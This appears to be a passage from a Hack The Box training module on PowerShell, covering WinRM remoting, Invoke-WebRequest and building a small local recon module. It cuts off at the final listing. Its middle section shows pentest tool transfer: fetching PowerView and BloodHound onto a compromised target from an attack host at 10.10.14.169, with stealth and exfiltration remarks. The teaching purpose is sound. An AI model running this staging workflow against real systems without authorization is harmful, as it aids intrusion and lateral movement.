[Windows Remote Management (WinRM)](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) can be configured using dedicated PowerShell cmdlets and we can enter into a PowerShell interactive session as well as issue commands on remote Windows target(s). We will notice that WinRM is more commonly enabled on Windows Server operating systems, so IT admins can perform tasks on one or multiple hosts. It's enabled by default in Windows Server.

Because of the increasing demand for the ability to remotely manage and automate tasks on Windows systems, we will likely see WinRM enabled on more & more Windows desktop operating systems (Windows 10 & Windows 11) as well. When WinRM is enabled on a Windows target, it listens on logical ports `5985` & `5986`.

#### Enabling & Configuring WinRM

WinRM can be enabled on a Windows target using the following commands:

  Networking Management from The CLI

```powershell-session
PS C:\WINDOWS\system32> winrm quickconfig

WinRM service is already running on this machine.
WinRM is not set up to allow remote access to this machine for management.
The following changes must be made:

Enable the WinRM firewall exception.
Configure LocalAccountTokenFilterPolicy to grant administrative rights remotely to local users.

Make these changes [y/n]? y

WinRM has been updated for remote management.

WinRM firewall exception enabled.
Configured LocalAccountTokenFilterPolicy to grant administrative rights remotely to local users.
```

As can be seen in the above output, running this command will automatically ensure all the necessary configurations are in place to:

- Enable the WinRM service
- Allow WinRM through the Windows Defender Firewall (Inbound and Outbound)
- Grant administrative rights remotely to local users

As long as credentials to access the system are known, anyone who can reach the target over the network can connect after that command is run. IT admins should take further steps to harden these WinRM configurations, especially if the system will be remotely accessible over the Internet. Among some of these hardening options are:

- Configure TrustedHosts to include just IP addresses/hostnames that will be used for remote management
- Configure HTTPS for transport
- Join Windows systems to an Active Directory Domain Environment and Enforce Kerberos Authentication

#### Testing PowerShell Remote Access

Once we have enabled and configured WinRM, we can test remote access using the [Test-WSMan](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) PowerShell cmdlet.

#### Testing Unauthenticated Access

  Networking Management from The CLI

```powershell-session
PS C:\Users\administrator> Test-WSMan -ComputerName "10.129.224.248"

wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0
```

Running this cmdlet sends a request that checks if the WinRM service is running. Keep in mind that this is unauthenticated, so no credentials are used, which is why no `OS` version is detected. This shows us that the WinRM service is running on the target.

#### Testing Authenticated Access

  Networking Management from The CLI

```powershell-session
PS C:\Users\administrator> Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate


wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
ProductVendor   : Microsoft Corporation
ProductVersion  : OS: 10.0.17763 SP: 0.0 Stack: 3.0
```

We can run the same command with the option `-Authentication Negotiate` to test if WinRM is authenticated, and we will receive the OS version (`10.0.11764`).

### PowerShell Remote Sessions

We also have the option to use the [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) cmdlet to establish a PowerShell session with a Windows target.

#### Establishing a PowerShell Session

  Networking Management from The CLI

```powershell-session
PS C:\Users\administrator> Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
[10.129.5.129]: PS C:\Users\htb-student\Documents> $PSVersionTable 
  
Name                           Value
----                           -----
PSVersion                      5.1.17763.592
PSEdition                      Desktop
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}
BuildVersion                   10.0.17763.592
CLRVersion                     4.0.30319.42000
WSManStackVersion              3.0
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
```

We can perform this same action from a Linux-based attack host with PowerShell core installed (like in Pwnbox). Remember that PowerShell is not exclusive to Windows and will run on other operating systems now.

#### Using Enter-PSSession from Linux

  Networking Management from The CLI

```shell-session
0xWAYNE@htb[/htb]$ [PS]> Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate

PowerShell credential request
Enter your credentials.
Password for user htb-student: ***************

[10.129.224.248]: PS C:\Users\htb-student\Documents> $PSVersionTable

Name                           Value                                           
----                           -----                                           
PSVersion                      5.1.19041.1                                     
PSEdition                      Desktop                                         
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}                         
BuildVersion                   10.0.19041.1                                    
CLRVersion                     4.0.30319.42000                                 
WSManStackVersion              3.0                                             
PSRemotingProtocolVersion      2.3                                             
SerializationVersion           1.1.0.1
```

Along with being OS agnostic, there are now tons of different tools that we can use to interact remotely with hosts. Picking a means to remotely administer our hosts mostly comes down to what you are comfortable with and what you can use based on the engagement or your environment security settings.

---

Networking is a pretty straightforward task to manage on Windows hosts. As your environments get more complex with cloud servers, multiple domains, and multiple sites across large geographical distances, network management at the level can get tedious. Luckily, we are only focused on our local host and how to manage a singular host. Moving forward, we will look at how we can interact with the web using PowerShell.

## Interacting With The Web

As an administrator, we can `automate` how we perform remote updates, install applications, and much more with tools and cmdlets through PowerShell. This will ensure that we can get the software, updates, and other objects we need on hosts locally and remotely without manually browsing for them via the GUI. This will save us time and enable us to remotely administer the hosts instead of sitting at its keyboard or RDP'ing in. As a pentester, this is a quick way to get tools and other items we need into the environment and to exfiltrate data if we have the infrastructure to send it to. This section will cover how we interact with the web and show several ways to utilize PowerShell to serve this purpose.

## How Do We Interact With The Web Using PowerShell?

When it comes to interacting with the web via PowerShell, the [Invoke-WebRequest](https://learn.microsoft.com/bs-latn-ba/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-5.1) cmdlet is our champion. We can use it to perform basic HTTP/HTTPS requests (like `GET` and `POST`), parse through HTML pages, download files, authenticate, and even maintain a session with a site. It's very versatile and easy to use in scripting and automation. If you prefer aliases, the Invoke-WebRequest cmdlet is aliased to `wget`, `iwr` and `curl`. Those familiar with Linux Fundamentals may be familiar with cURL and wget, as they are used to download files from the command line in Linux distributions. Let's look at the help from Invoke-WebRequest for a minute.

#### Invoke-WebRequest Help
```powershell-session
PS C:\Windows\system32> Get-Help Invoke-Webrequest

NAME
    Invoke-WebRequest

SYNOPSIS
    Gets content from a web page on the Internet.


SYNTAX
    Invoke-WebRequest [-Uri] <System.Uri> [-Body <System.Object>] [-Certificate
<SNIP>
DESCRIPTION
    > [!IMPORTANT] > The examples in this article reference hosts in the `contoso.com` domain. This is a fictitious >
    domain used by Microsoft for examples. The examples are designed to show how to use the cmdlets. > However, since
    the `contoso.com` sites don't exist, the examples don't work. Adapt the examples > to hosts in your environment.
```

Notice in the synopsis from the Get-Help output it states:

"`Gets content from a web page on the Internet.`"

While this is the core functionality, we can also use it to get content that we host on web servers in the same network environment. We have talked it up, and now let's try and do a simple web request using Invoke-WebRequest.

---

### A Simple Web Request

We can perform a basic Get request of a website using the `-Method GET` modifier with the Invoke-WebRequest cmdlet, as seen below. We will specify the URI as `https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html` for this example. We will also send it to `Get-Member` to inspect the object's output methods and properties.

#### Get Request with Invoke-WebRequest
```powershell-session
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | Get-Member


   TypeName: Microsoft.PowerShell.Commands.HtmlWebResponseObject

----              ---------- ----------
Dispose           Method     void Dispose(), void IDisposable.Dispose()
Equals            Method     bool Equals(System.Object obj)
GetHashCode       Method     int GetHashCode()
GetType           Method     type GetType()
```

Notice all the different properties this site has. We can now filter on those if we wish to show only a portion of the site. For example, what if we just wanted to see a listing of the images on the site? We can do that by performing the request and then filtering for just `Images` like so:

#### Filtering Incoming Content
```powershell-session
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images

Images : {@{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty Picture"
         src="example/prettypicture.jpg">; outerText=; tagName=IMG; alt=Pretty Picture;
         src=example/prettypicture.jpg}, @{innerHTML=; innerText=; outerHTML=<IMG alt="Pretty
         Picture" src="example/prettypicture.jpg" align=top>; outerText=; tagName=IMG; alt=Pretty
         Picture; src=example/prettypicture.jpg; align=top}}
```

Now we have an easy-to-read list of the images included in the website, and we can download them if we want. This is a super easy way only to get the information we wish to see. The raw content of the website we are enumerating looks like this:

#### Raw Content

  Interacting With The Web

```powershell-session
PS C:\htb> Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent

RawContent : HTTP/1.1 200 OK
             Strict-Transport-Security: max-age=16070400
             X-Content-Type-Options: nosniff
             X-XSS-Protection: 1; mode=block
             X-Frame-Options: SAMEORIGIN
             Accept-Ranges: bytes
             Content-Length: 1807
             Content-Type: text/html
             Date: Thu, 10 Nov 2022 16:25:07 GMT
             ETag: "70f-529340fa7b28d"
             Last-Modified: Wed, 13 Jan 2016 09:47:41 GMT
             Server: Apache/2.4.6 () OpenSSL/1.0.2k-fips

             <html>

             <head>
             <title>A very simple webpage</title>
             <basefont size=4>
             </head>

             <body bgcolor=FFFFFF>

             <h1>A very simple webpage. This is an "h1" level header.</h1>

             <h2>This is a level h2 header.</h2>

             <h6>This is a level h6 header.  Pretty small!</h6>
```

We could carve out this site's `raw content` instead of looking at everything from the request all at once. Notice how much easier it is to read? As a quick way to recon a website or pull key information out, such as names, addresses, and emails, it doesn't get much easier than this. Where `Invoke-WebRequest` gets handy is its ability to download files via the CLI. Let's look at downloading files now.

---

### Downloading Files using PowerShell

Whether performing sys admin, pentesting engagement, or disaster recovery-related tasks, files of all kinds will inevitably need to be downloaded to a Windows host. On a pentesting engagement, we may have compromised a target and want to transfer tools onto that host to enumerate the environment further and identify ways to get to other hosts & networks. PowerShell gives us some built-in options to do this. We will be focusing on Invoke-WebRequest for this module, but understand there are many different ways (some it's what they were meant for, others are unintentional by the tool creators) we could perform web requests and downloads.

### Downloading PowerView.ps1 from GitHub

We can practice using Invoke-WebRequest by downloading a popular tool used by many pentesters called [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

#### Download To Our Host

  Interacting With The Web

```powershell-session
PS C:\> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"

PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/5/2021   5:10 AM                PerfLogs
d-r---         7/25/2022   7:36 AM                Program Files
d-r---          6/5/2021   7:37 AM                Program Files (x86)
```

Using Invoke-WebRequest is simple; we specify the cmdlet and the exact URL of a resource we want to download:

`-Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"`

After the URL, we specify the location and file name of the resource on the Windows system we are downloading it from:

`-OutFile "C:\PowerView.ps1"`

We can also use Invoke-WebRequest to download files from web servers on the local network or a network reachable from the Windows target. It is common to find the need to transfer files from our attack host to a Windows target. One benefit to doing this would be if one of our goals during a pentest is to remain as stealthy as possible, we may not need to generate requests to the Internet that network security appliances could detect at the edge of the network. If we already had PowerView.ps1 stored on our `attack host` we could use a simple python web server to host PowerView.ps1 and download it from the target.

### Example Path to Bring Tools Into an Environment

If we already had PowerView.ps1 stored on our `attack host` we could use a simple Python web server to host PowerView.ps1 and download it from the target. From the attack host, we want to confirm that the file is already present or we need to download it. In this example, we can assume it is already on the attack host for demonstration purposes.

#### Using ls to View the File (Attack Host)

  Interacting With The Web

```shell-session
0xWAYNE@htb[/htb]$ ls

Dictionaries            Get-HttpStatus.ps1                    Invoke-Portscan.ps1          PowerView.ps1  Recon.psd1
Get-ComputerDetail.ps1  Invoke-CompareAttributesForClass.ps1  Invoke-ReverseDnsLookup.ps1  README.md      Recon.psm1
```

We start a simple python web server in the directory where PowerView.ps1 is located.

#### Starting the Python Web Server (Attack Host)

  Interacting With The Web

```shell-session
0xWAYNE@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Then, we would download the hosted file from the attack host using Invoke-WebRequest.

#### Downloading PowerView.ps1 from Web Server (From Attack Host to Target Host)

  Interacting With The Web

```powershell-session
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

As discussed previously, we can use the Invoke-WebRequest cmdlet to send commands to remote hosts. This can be pretty useful, especially when we discover vulnerabilities that allow us to execute commands on a Windows target but may not have access via an interactive shell or remote desktop session. This could allow us to download files onto the target host, allowing us to further our access to that target and move to others on the network. File transfer methods are covered in greater detail in the module [File Transfers](https://academy.hackthebox.com/module/details/24).

### What If We Can't Use Invoke-WebRequest?

So what happens if we are restricted from using `Invoke-WebRequest` for some reason? Not to fear, Windows provides several different methods to interact with web clients. The first and more challenging interaction path is utilizing the [.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0) class. This handy class is a .Net call we can utilize as Windows uses and understands .Net. This class contains standard system.net methods for interacting with resources via a URI (web addresses like github.com/project/tool.ps1). Let's look at an example:

#### Net.WebClient Download

  Interacting With The Web

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

PS C:\htb> ls

    Directory: C:\Users\MTanaka

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          11/10/2022 10:45 AM      108511752 Bloodhound.zip
-a---           6/14/2022  8:22 AM           4418 passwords.kdbx
-a---            9/9/2020  4:54 PM         696576 Start.exe
-a---           9/11/2021 12:58 PM              0 sticky.gpr
-a---          11/10/2022 10:44 AM      108511752 test.zip
```

So it worked. Let's break down what we did:

- First we have the Download cradle `(New-Object Net.WebClient).DownloadFile()`, which is how we tell it to execute our request.
- Next, we need to include the URI of the file we want to download as the first parameter in the (). For this example, that was `"https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip"`.
- Finally, we need to tell the command where we want the file written to with the second parameter `, "BloodHound.zip"`.

The command above would have downloaded the file to the current directory we are working from as `Bloodhound.zip`. Looking at our terminal, we can see that it executed successfully because the file `Bloodhound.zip` now exists in our `working directory`. If we wanted to place it somewhere else, we would have to specify the full path. From here, we can `extract` the tools and run them as we see fit. Keep in mind this is noisy because you will have web requests entering and leaving your network along with file reads and writes, so it `WILL` leave logs. If your transfers are done locally, only host to host, for example, you only leave logs on those hosts, which are a bit harder to sift through and leave less of a trace since we aren't writing ingress/egress logs at the customer boundary.

---

## Wrapping Up

This section has only scratched the surface of what we could do with PowerShell when interacting with the web. Be sure to take some time and practice the different types of requests you can send and even the many different ways you can filter and use the information you get. From this point, we will move on and talk about automation with PowerShell and how it can benefit us.

---

# PowerShell Scripting and Automation

As incredible as PowerShell is, it's only as good as how we use it. Much of the PowerShell language and functionality lends itself to being utilized in an automated fashion. Having the ability to build scripts and modules for us in PowerShell (no matter how simple or complex) can ease our administrative burden or clear some easy tasks off our plate as pentesters. This module will discuss the pieces and parts that make up a PowerShell script and module. By the end, we will have created our own easy-to-use and customizable module.

## Understanding PowerShell Scripting

PowerShell, by its nature, is modular and allows for a significant amount of control with its use. The traditional thought when dealing with scripting is that we are writing some form of an executable that performs tasks for us in the language it was created. With PowerShell, this is still true, with the exception that it can handle input from several different languages and file types and can handle many different object types. We can utilize singular scripts in the usual manner by calling them utilizing `.\script` syntax and importing modules using the `Import-Module` cmdlet. Now let's talk a bit about scripts and modules.

### Scripts vs. Modules

The easiest way to think of it is that a script is an executable text file containing PowerShell cmdlets and functions, while a module can be just a simple script, or a collection of multiple script files, manifests, and functions bundled together. The other main difference is in their use. You would typically call a script by executing it directly, while you can import a module and all of the associated scripts and functions to call at your whim. For the sake of this section, we will discuss them using the same term, and everything we talk about in a module file works in a standard PowerShell script. First up is `file extensions` and what they mean to us.

### File Extensions

To familiarize ourselves with some file extensions we will encounter while working with PowerShell scripts and modules, we have put together a small table with the extensions and their descriptions.

#### PowerShell Extensions

|**Extension**|**Description**|
|---|---|
|ps1|The `*.ps1` file extension represents executable PowerShell scripts.|
|psm1|The `*.psm1` file extension represents a PowerShell module file. It defines what the module is and what is contained within it.|
|psd1|The `*.psd1` is a PowerShell data file detailing the contents of a PowerShell module in a table of key/value pairs.|

These are the main extensions we are concerned with right now. In reality, PowerShell modules can have many different accompanying files with various extensions, but they are not requirements for what we are trying to do. If you wish for a deeper dive into PowerShell script files, and help files, check out this [Post](https://learn.microsoft.com/en-us/powershell/scripting/developer/module/writing-a-windows-powershell-module?view=powershell-7.2)

---

### Making a Module

So let's get down to it. From this point on, we will cover the components of a PowerShell module, what they contain, and how to create them. This process is simple. It just takes a bit of prior planning. Consider this scenario:

**Scenario**: We have found ourselves performing the same checks over and over when administering hosts. So to expedite our tasks, we will create a PowerShell module to run the checks for us and then output the information we ask for. Our module, when used, should output the host's `computer name`, `IP address`, and basic `domain information`, and provide us with the output of the `C:\Users\` directory so we can see what users have interactively logged into that host.

Now that we know what's going into our module, it's time to start building it out.

---

### Module Components

A module is made up of `four` essential components:

1. A `directory` containing all the required files and content, saved somewhere within `$env:PSModulePath`.

- This is done so that when you attempt to import it into your PowerShell session or Profile, it can be automatically found instead of having to specify where it is.

2. A `manifest` file listing all files and pertinent information about the module and its function.

- This could include associated scripts, dependencies, the author, example usage, etc.

3. Some code file - usually either a PowerShell script (`.ps1`) or a (`.psm1`) module file that contains our script functions and other information.
    
4. Other resources the module needs, such as help files, scripts, and other supporting documents.
    

This setup is standard practice but not strictly necessary. We could have our module be just a `*.psm1` file that contains our scripts and context, skipping the manifest and other helper files. PowerShell would be able to interpret and understand what to do in either instance. For the sake of propriety, we will work on building out a standard PowerShell module, including the manifest file and some built-in help functionality.

### Making a Directory to Hold Our Module

Making a directory is super simple, as discussed in earlier sections. Before we go any further, we need to create the directory to hold our module. This directory should be in one of the paths within `$env:PSModulePath`. If unsure as to what those paths are, you can call the variable to see where the best place would be. So we are going to make a folder named `quick-recon`.

#### Mkdir

  PowerShell Scripting and Automation

```powershell-session
PS C:\htb> mkdir quick-recon  

    Directory: C:\Users\MTanaka\Documents\WindowsPowerShell\Modules


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/31/2022   7:38 AM                quick-recon
```

Now that we have our directory, we can create the module. Let's discuss a `module manifest` file for a second.

### Module Manifest

A module manifest is a simple `.psd1` file that contains a hash table. The keys and values in the hash table perform the following functions:

- Describe the `contents` and `attributes` of the module.
- Define the `prerequisites`. ( specific modules from outside the module itself, variables, functions, etc.)
- Determine how the `components` are `processed`.

If you add a manifest file to the module folder, you can reference multiple files as a single unit by referencing the manifest. The `manifest` describes the following information:

- `Metadata` about the module, such as the module version number, the author, and the description.
- `Prerequisites` needed to import the module, such as the Windows PowerShell version, the common language runtime (CLR) version, and the required modules.
- `Processing` directives, such as the scripts, formats, and types to process.
- `Restrictions` on the module members to export, such as the aliases, functions, variables, and cmdlets to export.

We can quickly create a manifest file by utilizing `New-ModuleManifest` and specifying where we want it placed.

#### New-ModuleManifest

  PowerShell Scripting and Automation

```powershell-session
PS C:\htb> New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru

# Module manifest for module 'quick-recon'
#
# Generated by: MTanaka
#
# Generated on: 10/31/2022
#

@{

# Script module or binary module file associated with this manifest.
# RootModule = ''

# Version number of this module.
ModuleVersion = '1.0'

<SNIP>
```

By issuing the command above, we have provisioned a `new` manifest file populated with the default considerations. The `-PassThru` modifier lets us see what is being printed in the file and on the console. We can now go in and fill in the sections we want with the relevant info. Remember that all the lines in the manifest files are optional except for the `ModuleVersion` line. Editing the manifest will be easiest done from a GUI where you can utilize a text editor or IDE such as VSCode. If we were to complete our manifest file now for this module, it would appear something like this:

#### Sample Manifest
```powershell
# Module manifest for module 'quick-recon'
#
# Generated by: MTanaka
#
# Generated on: 10/31/2022
#

@{

# Script module or binary module file associated with this manifest.
# RootModule = 'C:\Users\MTanaka\WindowsPowerShell\Modules\quick-recon\quick-recon.psm1'

# Version number of this module.
ModuleVersion = '1.0'

# ID used to uniquely identify this module
GUID = '0a062bb1-8a1b-4bdb-86ed-5adbe1071d2f'

# Author of this module
Author = 'MTanaka'

# Company or vendor of this module
CompanyName = 'Greenhorn.Corp.'

# Copyright statement for this module
Copyright = '(c) 2022 Greenhorn.Corp. All rights reserved.'

# Description of the functionality provided by this module
Description = 'This module will perform several quick checks against the host for Reconnaissance of key information.'

# Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
FunctionsToExport = @()

# Cmdlets to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no cmdlets to export.
CmdletsToExport = @()

# Variables to export from this module
VariablesToExport = '*'

# Aliases to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no aliases to export.
AliasesToExport = @()

# List of all modules packaged with this module
# ModuleList = @()

# List of all files packaged with this module
# FileList = @()  
}
```

### Create Our Script File

We can use the `New-Item` (ni) cmdlet to create our file.

#### New-Item
```powershell-session
PS C:\htb>  ni quick-recon.psm1 -ItemType File


    Directory: C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/31/2022   9:07 AM              0 quick-recon.psm1
```

Easy enough, right? Now to fill in this beast.

### Importing Modules You Need

If our new PowerShell requires other modules or cmdlets from within them to operate correctly, we will place an `Import-Module` string at the beginning of our script file. The use of Import-Module in this manner functions much like it would if we issued it from within the shell; it calls and loads the modules we need before executing our script. To accomplish the goals we have for this module, many of the cmdlets and functions are already built-in into PowerShell. We do need one from the ActiveDirectory PowerShell module, however. So let's add an import line for the `ActiveDirectory` module.

#### Import Into Our Module
```powershell
Import-Module ActiveDirectory 
```

Pretty simple right? Now we have our module script file `quick-recon.psm1`, and we have added an `import-module` statement within. Now we can get to the meat of the file, our `functions`.

### Functions and doing work with Powershell

We need to do four main things with this module:

- Retrieve the host ComputerName
- Retrieve the hosts IP configuration
- Retrieve basic domain information
- Retrieve an output of the "C:\Users" directory

To get started, let's focus on the ComputerName output. We can get this many ways with various cmdlets, modules, and DOS commands. Our script will utilize the environment variable (`$env:ComputerName`) to acquire the hostname for the output. To make our output easier to read later, we will use another variable named `$hostname` to store the output from the environment variable. To capture the IP address for the active host adapters, we will use `IPConfig` and store that info in the variable `$IP`. For Basic domain information, we will use `Get-ADDomain` and store the output into `$Domain`. Lastly, we will grab a listing of the user folders in C:\Users\ with `Get-ChildItem` and store it in `$Users`. To create our variables, we must first specify a name like (`$Hostname`), append the "=" symbol, and then follow it with the action or values we want it to hold. For example, the first variable we need, `$Hostname`, would appear like so: (`$Hostname = $env:ComputerName`). Now let's dive in and create the rest of our variables for use.

#### Variables
```powershell
Import-Module ActiveDirectory 

$Hostname = $env:ComputerName
$IP = ipconfig 
$Domain = Get-ADDomain  
$Users = Get-ChildItem C:\Users\ 
  
```

Our variables are now set to run singular commands or functions, grabbing the needed output. Now let's format that data and give ourselves some nice output. We can do this by writing the result to a `file` using `New-Item` and `Add-Content`. To make things easier, we will make this output process into a callable function called `Get-Recon`.

#### Output Our Info

Code: powershell

```powershell
Import-Module ActiveDirectory

function Get-Recon {  

    $Hostname = $env:ComputerName  

    $IP = ipconfig

    $Domain = Get-ADDomain 

    $Users = Get-ChildItem C:\Users\

    new-Item ~\Desktop\recon.txt -ItemType File 

    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users

    Add-Content ~\Desktop\recon.txt $Vars
  } 
```

`New-Item` creates our output file for us first, then notice how we utilized one more variable (`$Vars`) to format our output. We call each variable and insert a descriptive line in between each. Lastly, the `Add-Content` cmdlet appends the data we gather into a file called recon.txt by writing the results of $Vars. Our function is shaping up now. Next, we need to add some comments to our file so that others can understand what we are trying to accomplish and why we did it the way we did.

### Comments within the Script

The (`#`) will tell PowerShell that the line contains a comment within your script or module file. If your comments are going to encompass several lines, you can use the `<#` and `#>` to wrap several lines as one large comment like seen below:

#### Comment Blocks

```powershell

# This is a single-line comment.  

<# This line and the following lines are all wrapped in the Comment specifier. 
Nothing with this window will be ready by the script as part of a function.
This text exists purely for the creator and us to convey pertinent information.

#>  
```

#### Comments Added

```powershell
Import-Module ActiveDirectory

function Get-Recon {  
    # Collect the hostname of our PC.
    $Hostname = $env:ComputerName  
    # Collect the IP configuration.
    $IP = ipconfig
    # Collect basic domain information.
    $Domain = Get-ADDomain 
    # Output the users who have logged in and built out a basic directory structure in "C:\Users\".
    $Users = Get-ChildItem C:\Users\
    # Create a new file to place our recon results in.
    new-Item ~\Desktop\recon.txt -ItemType File 
    # A variable to hold the results of our other variables. 
    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
    # It does the thing 
    Add-Content ~\Desktop\recon.txt $Vars
  } 
```

It's as simple as that. Nothing too crazy with comments. Now we need to include a bit of `help` syntax so others can understand how to use our module.

### Including Help

PowerShell utilizes a form of `Comment-based help` to embed whatever you need for the script or module. We can utilize `comment blocks` like those we discussed above, along with recognized `keywords` to build the help section out and even call it using `Get-Help` afterward. When it comes to placement, we have `two` options here. We can place the help within the function itself or outside of the function in the script. If we wish to place it within the function, it must be at the beginning of the function, right after the opening line for the function, or at the end of the function, one line after the last action of the function. If we place it within the script but outside of the function itself, we must place it above our function with no more than one line between the help and function. For a deeper dive into help within PowerShell, check out this [article](https://learn.microsoft.com/en-us/powershell/scripting/developer/help/writing-help-for-windows-powershell-scripts-and-functions?view=powershell-7.2). Now let's define our help section. We will place it outside of the function at the top of the script for now.

#### Module Help

```powershell
Import-Module ActiveDirectory

<# 
.Description  
This function performs some simple recon tasks for the user. We import the module and issue the 'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for our understanding. Right now, this module will only work on the local host from which you run it, and the output will be sent to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions are coming soon!  

.Example  
After importing the module run "Get-Recon"
'Get-Recon


    Directory: C:\Users\MTanaka\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                        
----                 -------------         ------ ----                                                                                                                                        
-a----         11/3/2022  12:46 PM              0 recon.txt '

.Notes  
Remote Recon functions coming soon! This script serves as our initial introduction to writing functions and scripts and making PowerShell modules.  

#>

function Get-Recon {  
<SNIP>  
```

Notice our use of `keywords`. To specify a keyword within the comment block, we use the syntax `.<keyword>` and then place the flavor text underneath. We only specified `Description, Example, and Notes`, but several more keywords can be placed in the help block. To see all the available keywords, reference this article on [Comment Based Help Keywords](https://learn.microsoft.com/en-us/powershell/scripting/developer/help/comment-based-help-keywords?view=powershell-7.2). Our last portion to discuss before wrapping everything up into our nice PowerShell Module file, is Exporting and Protecting functions.

### Protecting Functions

We may add functions to our scripts that we do not want to be accessed, exported, or utilized by other scripts or processes within PowerShell. To protect a function from being exported or to explicitly set it for export, the `Export-ModuleMember` is the cmdlet for the job. The contents are exportable if we leave this out of our script modules. If we place it in the file but leave it blank like so:

#### Exclude From Export
```powershell
Export-ModuleMember  
```

It ensures that the module's variables, aliases, and functions cannot be `exported`. If we wish to specify what to export, we can add them to the command string like so:

#### Export Specific Functions and Variables
```powershell
Export-ModuleMember -Function Get-Recon -Variable Hostname 
```

Alternatively, if you only wanted to export all functions and a specific variable, for example, you could issue the `*` after -Function and then specify the Variables to export explicitly. So let's add the `Export-ModuleMember` cmdlet to our script and specify that we want to allow our function `Get-Recon` and our variable `Hostname` to be available for export.

#### Export Line Addition
```powershell
<SNIP>  
function Get-Recon {  
    # Collect the hostname of our PC
    $Hostname = $env:ComputerName  
    # Collect the IP configuration
    $IP = ipconfig
    # Collect basic domain information
    $Domain = Get-ADDomain 
    # Output the users who have logged in and built out a basic directory structure in "C:\Users"
    $Users = Get-ChildItem C:\Users\
    # Create a new file to place our recon results in
    new-Item ~\Desktop\recon.txt -ItemType File 
    # A variable to hold the results of our other variables 
    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
    # It does the thing 
    Add-Content ~\Desktop\recon.txt $Vars
  } 

Export-ModuleMember -Function Get-Recon -Variable Hostname  
```

### Scope

When dealing with scripts, the PowerShell session, and how stuff is recognized at the Commandline, the concept of Scope comes into play. Scope, in essence, is how PowerShell recognizes and protects objects within the session from unauthorized access or modification. PowerShell currently uses `three` different Scope levels:

#### Scope Levels

|**Scope**|**Description**|
|---|---|
|Global|This is the default scope level for PowerShell. It affects all objects that exist when PowerShell starts, or a new session is opened. Any variables, aliases, functions, and anything you specify in your PowerShell profile will be created in the Global scope.|
|Local|This is the current scope you are operating in. This could be any of the default scopes or child scopes that are made.|
|Script|This is a temporary scope that applies to any scripts being run. It only applies to the script and its contents. Other scripts and anything outside of it will not know it exists. To the script, Its scope is the local scope.|

This matters to us if we do not want anything outside the scope we are running the script in to access its contents. Additionally, we can have child scopes created within the main scopes. For example, when you run a script, the script scope is instantiated, and then any function that is called can also spawn a child scope surrounding that function and its included variables. If we wanted to ensure that the contents of that specific function were not accessible to the rest of the script or the PowerShell session itself, we could modify its scope. This is a complex topic and something above the level of this module currently, but we felt it was worth mentioning. For more on Scope in PowerShell, check out the documentation [here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scopes?view=powershell-7.2).

### Putting It All Together

Now that we have gone through and created our pieces and parts let's see it all together.

#### Final Product
```powershell
import-module ActiveDirectory

<# 
.Description  
